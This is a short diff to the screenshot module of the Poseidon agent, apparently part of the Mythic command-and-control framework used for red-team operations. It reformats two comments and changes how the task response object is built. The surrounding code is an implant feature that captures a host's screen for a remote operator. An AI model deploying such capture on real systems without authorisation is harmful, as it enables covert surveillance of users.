@@ -10,17 +10,16 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-//ScreenShot - interface for holding screenshot data
+// ScreenShot - interface for holding screenshot data
 type ScreenShot interface {
 	Monitor() int
 	Data() []byte
 }
 
-//Run - function used to obtain screenshots
+// Run - function used to obtain screenshots
 func Run(task structs.Task) {
 	result, err := getscreenshot()
-	msg := structs.Response{}
-	msg.TaskID = task.TaskID
+	msg := task.NewResponse()
 	if err != nil {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
